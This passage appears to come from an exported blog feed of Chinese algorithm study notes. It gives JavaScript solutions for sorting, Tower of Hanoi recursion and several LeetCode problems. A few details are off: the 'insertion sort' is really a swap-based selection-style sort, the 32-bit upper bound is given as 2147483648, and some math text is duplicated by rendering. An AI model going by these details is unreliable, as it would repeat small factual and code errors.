<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 插入排序，默认第一个最小</span><br><span class="line"> * @param &#123;Array&lt;Number&gt;&#125; arry 要排序的数组</span><br><span class="line"> *&#x2F;</span><br><span class="line">function insertSort(arry: Array&lt;Number&gt;): Array&lt;Number&gt; &#123;</span><br><span class="line">    if (arry.length &#x3D;&#x3D; 0) &#123;&#x2F;&#x2F;判断数组不为空</span><br><span class="line">        return [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (let i &#x3D; 1; i &lt; arry.length; i++) &#123;&#x2F;&#x2F;从1开始，默认第一个最小</span><br><span class="line">        for (let j &#x3D; i; j &lt; arry.length; j++) &#123;</span><br><span class="line">            let temp &#x3D; arry[i - 1];&#x2F;&#x2F;要比较插入的对象</span><br><span class="line">            if (temp &gt; arry[j]) &#123;&#x2F;&#x2F;交换</span><br><span class="line">                arry[i - 1] &#x3D; arry[j];</span><br><span class="line">                arry[j] &#x3D; temp;</span><br><span class="line">            &#125;</span><br><span class="line">            console.log(JSON.stringify(arry))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return arry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-f12c9836893ac6d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>桶排序</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E6%A1%B6%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 桶排序（只支持整数）</span><br><span class="line"> * max：数组的最大数值,必须大于0， 整数</span><br><span class="line"> * sortArry：排序数组    数组</span><br><span class="line"> * type：排序方式，默认1：从小到大，0：从大到小</span><br><span class="line"> * 返回排序后数组，异常情况返回false</span><br><span class="line"> **&#x2F;</span><br><span class="line">function bucketsort(max,sortArray,type &#x3D; 1)&#123;</span><br><span class="line">    if(max &lt;&#x3D;0 || !sortArray)&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        let bucketArray &#x3D; new Array(max);</span><br><span class="line">        let tempArray &#x3D; [];</span><br><span class="line">        sortArray.forEach((item,index)&#x3D;&gt;&#123;</span><br><span class="line">            bucketArray[item] &#x3D; (bucketArray[item]?bucketArray[item]:0)+1;</span><br><span class="line">        &#125;)</span><br><span class="line">        bucketArray.forEach((item,index)&#x3D;&gt;&#123;</span><br><span class="line">            if(item &amp;&amp; item &gt;0)&#123;</span><br><span class="line">                for(let i&#x3D;0;i&lt;item;i++)&#123;</span><br><span class="line">                    if(type &#x3D;&#x3D; 1)&#123;&#x2F;&#x2F;从小到大</span><br><span class="line">                        tempArray.push(index)</span><br><span class="line">                    &#125;else&#123;&#x2F;&#x2F;从大到小</span><br><span class="line">                        tempArray.unshift(index)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return tempArray</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>汉诺塔学习递归</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E6%B1%89%E8%AF%BA%E5%A1%94%E5%AD%A6%E4%B9%A0%E9%80%92%E5%BD%92/</url>
    <content><![CDATA[<h2 id="一．起源："><a href="#一．起源：" class="headerlink" title="一．起源："></a>一．起源：</h2><p>　　汉诺塔（又称河内塔）问题是源于印度一个古老传说的益智玩具。大梵天创造世界的时候做了三根金刚石柱子，在一根柱子上从下往上按照大小顺序摞着64片黄金圆盘。大梵天命令婆罗门把圆盘从下面开始按大小顺序重新摆放在另一根柱子上。并且规定，在小圆盘上不能放大圆盘，在三根柱子之间一次只能移动一个圆盘。</p>
<h2 id="二．抽象为数学问题："><a href="#二．抽象为数学问题：" class="headerlink" title="二．抽象为数学问题："></a>二．抽象为数学问题：</h2><p>　　如下图所示，从左到右有A、B、C三根柱子，其中A柱子上面有从小叠到大的n个圆盘，现要求将A柱子上的圆盘移到C柱子上去，期间只有一个原则：一次只能移到一个盘子且大盘子不能在小盘子上面，求移动的步骤和移动的次数</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7ffe40e3934c27e1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）n &#x3D;&#x3D; 1</span><br><span class="line"></span><br><span class="line">       　　　　　　第1次  1号盘  A----&gt;C       sum &#x3D; 1 次</span><br><span class="line"></span><br><span class="line"> (2)  n &#x3D;&#x3D; 2</span><br><span class="line"></span><br><span class="line">       　　　　　　第1次  1号盘  A----&gt;B</span><br><span class="line"></span><br><span class="line">      　　　　　　 第2次  2号盘  A----&gt;C</span><br><span class="line"></span><br><span class="line">       　　　　　　第3次  1号盘  B----&gt;C        sum &#x3D; 3 次</span><br><span class="line"></span><br><span class="line"> （3）n &#x3D;&#x3D; 3</span><br><span class="line"></span><br><span class="line">　　　　　　　　    第1次  1号盘  A----&gt;C</span><br><span class="line"></span><br><span class="line">　　　　　　　　    第2次  2号盘  A----&gt;B</span><br><span class="line"></span><br><span class="line">　　　　　　　　    第3次  1号盘  C----&gt;B</span><br><span class="line">  </span><br><span class="line">　　　　　　　　    第4次  3号盘  A----&gt;C</span><br><span class="line"></span><br><span class="line">　　　　　　　　    第5次  1号盘  B----&gt;A</span><br><span class="line"></span><br><span class="line">　　　　　　　　    第6次  2号盘  B----&gt;C</span><br><span class="line"></span><br><span class="line">　　　　　　　　    第7次  1号盘  A----&gt;C        sum &#x3D; 7 次</span><br></pre></td></tr></table></figure>
<h2 id="三．算法分析（递归算法）"><a href="#三．算法分析（递归算法）" class="headerlink" title="三．算法分析（递归算法）"></a>三．算法分析（递归算法）</h2><pre><code>   求解汉诺塔问题最简单的算法还是通过递归算法，递归就是自己是一个方法或者说是函数，但是在自己这个函数里有调用自己这个函数的语句，而这个调用怎么才能调用结束呢？，这里还必须有一个结束点，或者具体的说是在调用到某一次后函数能返回一个确定的值，接着倒数第二个就能返回一个确定的值，一直到第一次调用的这个函数能返回一个确定的值。
  实现这个算法可以简单分为三个步骤：
</code></pre>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　　　（1）     把n-1个盘子由A 移到 B；</span><br><span class="line"></span><br><span class="line">　　　　（2）     把第n个盘子由 A移到 C；</span><br><span class="line"></span><br><span class="line">　　　　（3）     把n-1个盘子由B 移到 C；</span><br></pre></td></tr></table></figure>

<h2 id="算法实现："><a href="#算法实现：" class="headerlink" title="算法实现："></a>算法实现：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">* 汉诺塔递归程序</span><br><span class="line">* level:当前移动的层数</span><br><span class="line">* from:移动开始点</span><br><span class="line">* pass:中间辅助点</span><br><span class="line">* to:移动目标位置</span><br><span class="line">**&#x2F;</span><br><span class="line">function hanoi(level,from,pass,to)&#123;</span><br><span class="line">  &#x2F;**</span><br><span class="line">  *  移动递归主函数</span><br><span class="line">  * level:当前移动的层数</span><br><span class="line">  * from:移动开始点</span><br><span class="line">  * pass:中间辅助点</span><br><span class="line">  * to:移动目标位置</span><br><span class="line">  **&#x2F;</span><br><span class="line">  function move(level,from,pass,to)&#123;</span><br><span class="line">    if(level &#x3D;&#x3D;&#x3D; 1)&#123;</span><br><span class="line">      moveConsole(1,from,to);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      move(level-1,from,to,pass);</span><br><span class="line">      moveConsole(level,from,to);</span><br><span class="line">      move(level-1,pass,from,to);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#x2F;**</span><br><span class="line">  *  移动打印</span><br><span class="line">  * id:当前移动的盘子</span><br><span class="line">  * from:移动开始点</span><br><span class="line">  * to:移动目标位置</span><br><span class="line">  **&#x2F;</span><br><span class="line">  function moveConsole(id,from,to)&#123;</span><br><span class="line">    console.log(&#96;第$&#123;++num&#125;次移动，将$&#123;id&#125;号盘$&#123;from&#125;-&gt;$&#123;to&#125;&#96;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  let num &#x3D; 0;&#x2F;&#x2F;移动次数</span><br><span class="line">  move(level,from,pass,to);&#x2F;&#x2F;开始移动</span><br><span class="line">  console.log(&#96;$&#123;level&#125;层汉诺塔共移动$&#123;num&#125;次&#96;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-33e0da531f98e2e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>算法-两数之和</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 的那 两个 整数，并返回它们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p>
<p>你可以按任意顺序返回答案。</p>
<h5 id="示例-1："><a href="#示例-1：" class="headerlink" title="示例 1："></a>示例 1：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [2,7,11,15], target &#x3D; 9</span><br><span class="line">输出：[0,1]</span><br><span class="line">解释：因为 nums[0] + nums[1] &#x3D;&#x3D; 9 ，返回 [0, 1] 。</span><br></pre></td></tr></table></figure>
<h5 id="示例-2："><a href="#示例-2：" class="headerlink" title="示例 2："></a>示例 2：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [3,2,4], target &#x3D; 6</span><br><span class="line">输出：[1,2]</span><br></pre></td></tr></table></figure>
<h5 id="示例-3："><a href="#示例-3：" class="headerlink" title="示例 3："></a>示例 3：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [3,3], target &#x3D; 6</span><br><span class="line">输出：[0,1]</span><br></pre></td></tr></table></figure>

<h2 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @param &#123;number[]&#125; nums</span><br><span class="line"> * @param &#123;number&#125; target</span><br><span class="line"> * @return &#123;number[]&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">var twoSum &#x3D; function(nums, target) &#123;</span><br><span class="line">    let i&#x3D;0,j&#x3D;-1;</span><br><span class="line">    for(;i&lt;nums.length;i++)&#123;</span><br><span class="line">        let temp &#x3D; target-nums[i];&#x2F;&#x2F;找到与当前相差的数</span><br><span class="line">      	let isfind &#x3D; false;</span><br><span class="line">      	for(j&#x3D;i+1;j&lt;nums.length;j++)&#123;&#x2F;&#x2F;从i+1开始，是为了减少循环次数，因为前面的已经比较过了</span><br><span class="line">          if(nums[j]&#x3D;&#x3D;temp)&#123;</span><br><span class="line">            isfind &#x3D; true;</span><br><span class="line">            break;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      if(isfind)&#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return[i,j]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>算法-只出现一次的数字</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95-%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p>
<blockquote>
<p>说明：<br>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p>
</blockquote>
<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2,2,1]</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure>
<h5 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2:"></a>示例 2:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [4,1,2,1,2]</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>如果不考虑时间复杂度和空间复杂度的限制，这道题有很多种解法，如找一个数组储存数字，如果再次出现则删除，最后剩余数字为只出现一次的数字。但是这种算法都需要新增空间来存储临时对象。</p>
<p>如何才能做到线性时间复杂度和常数空间复杂度呢？</p>
<p>答案是使用<code>位运算</code>。对于这道题，可使用异或运算 ⊕。异或运算有以下三个性质。</p>
<ul>
<li>任何数和 00 做异或运算，结果仍然是原来的数，即 a⊕0=a。</li>
<li>任何数和其自身做异或运算，结果是 0，即 a⊕a=0。</li>
<li>异或运算满足交换律和结合律，即 a⊕b⊕a=b⊕a⊕a=b⊕(a⊕a)=b⊕0=b。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @param &#123;number[]&#125; nums</span><br><span class="line"> * @return &#123;number&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">var singleNumber &#x3D; function(nums) &#123;</span><br><span class="line">    let single &#x3D; 0;</span><br><span class="line">    nums.forEach((item)&#x3D;&gt;&#123;</span><br><span class="line">        single ^&#x3D; item;&#x2F;&#x2F;javascript中的异或操作为^</span><br><span class="line">    &#125;);</span><br><span class="line">    return single;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><ul>
<li>时间复杂度：<code>O(n)</code>，其中 n 是数组长度。只需要对数组遍历一次。</li>
<li>空间复杂度：<code>O(1)</code>。</li>
</ul>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>算法-合并排序</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95-%E5%90%88%E5%B9%B6%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<p><strong>合并排序（MERGE-SORT）</strong>是利用归并的思想实现的排序方法，该算法采用经典的分治（divide-and-conquer）策略</p>
<ul>
<li>其基本模式如下：<br>分解：把一个问题分解成与原问题相似的子问题<br>解决：递归的解各个子问题<br>合并：合并子问题的结果得到了原问题的解。</li>
</ul>
<p>动态效果示意图：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-aaded18e961d5438.gif?imageMogr2/auto-orient/strip"></p>
<p><strong>分阶段：</strong>递归拆分子序列的过程。<br><strong>治阶段：</strong>将两个已经有序的子序列合并成一个有序序列<br><img src="https://upload-images.jianshu.io/upload_images/10024246-eb3bca3454827d7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 合并排序算法</span><br><span class="line"> * @param &#123;Arry[number]&#125; arr 待排序数组</span><br><span class="line"> *&#x2F;</span><br><span class="line">function mergeSort(arr) &#123;</span><br><span class="line">    &#x2F;&#x2F; 采用自上而下的递归方法</span><br><span class="line">    var len &#x3D; arr.length;</span><br><span class="line">    if (len &lt; 2) &#123;&#x2F;&#x2F;只有1个数就返回</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line">    var middle &#x3D; Math.floor(len &#x2F; 2),&#x2F;&#x2F;中间值</span><br><span class="line">        left &#x3D; arr.slice(0, middle),&#x2F;&#x2F;左边数组</span><br><span class="line">        right &#x3D; arr.slice(middle);&#x2F;&#x2F;右边数组</span><br><span class="line">    return merge(mergeSort(left), mergeSort(right));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 把两个数组合并排序</span><br><span class="line"> * @param &#123;Arry[number]&#125;&#125; left 待合并数组</span><br><span class="line"> * @param &#123;Arry[number]&#125; right 待合并数组</span><br><span class="line"> *&#x2F;</span><br><span class="line">function merge(left, right) &#123;</span><br><span class="line">  var result &#x3D; [];</span><br><span class="line"></span><br><span class="line">  while (left.length &amp;&amp; right.length) &#123;&#x2F;&#x2F;两个数组中都有值</span><br><span class="line">    &#x2F;&#x2F;左边小于右边则把左边数组第一个放入结果中，否则把右边数组第一个放入结果</span><br><span class="line">    &#x2F;&#x2F;同时删除该数组</span><br><span class="line">    if (left[0] &lt;&#x3D; right[0]) &#123;</span><br><span class="line">      result.push(left.shift());</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      result.push(right.shift());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;只有左边数组</span><br><span class="line">  while (left.length) result.push(left.shift());</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;只有右边数组</span><br><span class="line">  while (right.length) result.push(right.shift());</span><br><span class="line"></span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>归并排序是稳定排序，它也是一种十分高效的排序，能利用完全二叉树特性的排序。每次合并操作的平均时间复杂度为<code>O(n)</code>，总的平均时间复杂度为<code>O(nlogn)</code>。而且，归并排序的最好，最坏，平均时间复杂度均为<code>O(nlogn)</code>。</p>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>算法-整数反转</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95-%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个 32 位的有符号整数 x ，返回将 x 中的数字部分反转后的结果。<br>如果反转后整数超过 32 位的有符号整数的范围 [-2147483648,  2147483648] ，就返回 0。</p>
<blockquote>
<p>假设环境不允许存储 64 位整数（有符号或无符号）。</p>
</blockquote>
<h5 id="示例-1："><a href="#示例-1：" class="headerlink" title="示例 1："></a>示例 1：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：x &#x3D; 123</span><br><span class="line">输出：321</span><br></pre></td></tr></table></figure>
<h5 id="示例-2："><a href="#示例-2：" class="headerlink" title="示例 2："></a>示例 2：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：x &#x3D; -123</span><br><span class="line">输出：-321</span><br></pre></td></tr></table></figure>
<h5 id="示例-3："><a href="#示例-3：" class="headerlink" title="示例 3："></a>示例 3：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：x &#x3D; 120</span><br><span class="line">输出：21</span><br></pre></td></tr></table></figure>
<h5 id="示例-4："><a href="#示例-4：" class="headerlink" title="示例 4："></a>示例 4：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：x &#x3D; 0</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @param &#123;number&#125; x</span><br><span class="line"> * @return &#123;number&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">var reverse &#x3D; function(x) &#123;</span><br><span class="line">    const temp &#x3D; x.toString();</span><br><span class="line">    const index &#x3D; temp.indexOf(&#39;-&#39;);</span><br><span class="line">    const newStr &#x3D; temp.substring((index+1)).split(&#39;&#39;).reverse().join(&#39;&#39;);</span><br><span class="line">    const reverseNum &#x3D; parseInt(index&#x3D;&#x3D;&#x3D;0?&#39;-&#39;+newStr:newStr);</span><br><span class="line">    if(reverseNum&gt;2147483648 || reverseNum&lt;-2147483648)&#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    return reverseNum;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>算法-有效的括号</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95-%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串 s ，判断字符串是否有效。<br>有效字符串需满足：</p>
<ul>
<li>左括号必须用相同类型的右括号闭合。</li>
<li>左括号必须以正确的顺序闭合。<br> ##### 示例 1：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;()&quot;</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<h5 id="示例-2："><a href="#示例-2：" class="headerlink" title="示例 2："></a>示例 2：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;()[]&#123;&#125;&quot;</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<h5 id="示例-3："><a href="#示例-3：" class="headerlink" title="示例 3："></a>示例 3：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;(]&quot;</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
<h5 id="示例-4："><a href="#示例-4：" class="headerlink" title="示例 4："></a>示例 4：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;([)]&quot;</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
<h5 id="示例-5："><a href="#示例-5：" class="headerlink" title="示例 5："></a>示例 5：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;&#123;[]&#125;&quot;</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/valid-parentheses">https://leetcode-cn.com/problems/valid-parentheses</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
</blockquote>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @param &#123;string&#125; s</span><br><span class="line"> * @return &#123;boolean&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">var isValid &#x3D; function(s) &#123;</span><br><span class="line">    if(s.length % 2 !&#x3D; 0 )&#123;&#x2F;&#x2F;字符串长度是偶数</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    let temp &#x3D;[s.charAt(0)];&#x2F;&#x2F;代比较数组</span><br><span class="line">    let flag &#x3D; true;</span><br><span class="line">    for(let i &#x3D;1;i&lt;s.length ;i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;括号都是成对出现的，当出现右括号时，</span><br><span class="line">        &#x2F;&#x2F;如果最后一位不是对应的左括号，则不匹配，需要退出循环，</span><br><span class="line">        &#x2F;&#x2F;如果匹配，退出最后一位</span><br><span class="line">        &#x2F;&#x2F;如果当前为左括号，则放入数组中</span><br><span class="line">        switch(s.charAt(i))&#123;</span><br><span class="line">            case &#39;)&#39;:</span><br><span class="line">                temp.slice(-1) &#x3D;&#x3D; &#39;(&#39;?temp.pop():flag&#x3D;false;</span><br><span class="line">                break;</span><br><span class="line">            case &#39;&#125;&#39;:</span><br><span class="line">                temp.slice(-1) &#x3D;&#x3D; &#39;&#123;&#39;?temp.pop():flag&#x3D;false;</span><br><span class="line">                break;</span><br><span class="line">            case &#39;]&#39;:</span><br><span class="line">                temp.slice(-1) &#x3D;&#x3D; &#39;[&#39;?temp.pop():flag&#x3D;false;</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                temp.push(s.charAt(i));</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">        if(!flag)&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return !flag||temp.length&gt;0?false:true;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><ul>
<li>时间复杂度：O(n)，其中 n 是字符串 s 的长度。</li>
<li>空间复杂度：O(n)，最差情况为字符串全部为左括号。</li>
</ul>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>算法-爬楼梯</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95-%E7%88%AC%E6%A5%BC%E6%A2%AF/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。<br>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>
<blockquote>
<p>注意：给定 n 是一个正整数。</p>
</blockquote>
<h5 id="示例-1："><a href="#示例-1：" class="headerlink" title="示例 1："></a>示例 1：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 2</span><br><span class="line">输出： 2</span><br><span class="line">解释： 有两种方法可以爬到楼顶。</span><br><span class="line">1.  1 阶 + 1 阶</span><br><span class="line">2.  2 阶</span><br></pre></td></tr></table></figure>
<h5 id="示例-2："><a href="#示例-2：" class="headerlink" title="示例 2："></a>示例 2：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 3</span><br><span class="line">输出： 3</span><br><span class="line">解释： 有三种方法可以爬到楼顶。</span><br><span class="line">1.  1 阶 + 1 阶 + 1 阶</span><br><span class="line">2.  1 阶 + 2 阶</span><br><span class="line">3.  2 阶 + 1 阶</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>用 f(x)f(x) 表示爬到第 xx 级台阶的方案数，考虑最后一步可能跨了一级台阶，也可能跨了两级台阶，所以我们可以列出如下式子：<br><code>f(x) = f(x - 1) + f(x - 2)</code><br>它意味着爬到第 xx 级台阶的方案数是爬到第 x - 1级台阶的方案数和爬到第 x - 2x级台阶的方案数的和。很好理解，因为每次只能爬 11 级或 22 级，所以 f(x)只能从 f(x - 1) 和 f(x - 2)转移过来，而这里要统计方案总数，我们就需要对这两项的贡献求和。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @param &#123;number&#125; n</span><br><span class="line"> * @return &#123;number&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">var climbStairs &#x3D; function(n) &#123;</span><br><span class="line">    let p &#x3D; 0, q &#x3D; 0, r &#x3D; 1;</span><br><span class="line">    for (let i &#x3D; 1; i &lt;&#x3D; n; ++i) &#123;</span><br><span class="line">        p &#x3D; q;</span><br><span class="line">        q &#x3D; r;</span><br><span class="line">        r &#x3D; p + q;</span><br><span class="line">    &#125;</span><br><span class="line">    return r;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;递归写法</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @param &#123;number&#125; n</span><br><span class="line"> * @return &#123;number&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">var climbStairs &#x3D; function(n) &#123;</span><br><span class="line">    &#x2F;&#x2F;实现f（x）&#x3D; f(x-1)+f(x-2);</span><br><span class="line">    &#x2F;&#x2F; 优化效率，可以记住已算过的数据，直接返回；</span><br><span class="line">    if(n &#x3D;&#x3D; 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;else if(n &#x3D;&#x3D; 2 )&#123;</span><br><span class="line">        return 2;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return climbStairs(n-1)+climbStairs(n-2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><p>时间复杂度：循环执行 n 次，每次花费常数的时间代价，故渐进时间复杂度为 O(n)。<br>空间复杂度：这里只用了常数个变量作为辅助空间，故渐进空间复杂度为 O(1)。</p>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>算法-罗马数字转整数</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95-%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E8%BD%AC%E6%95%B4%E6%95%B0/</url>
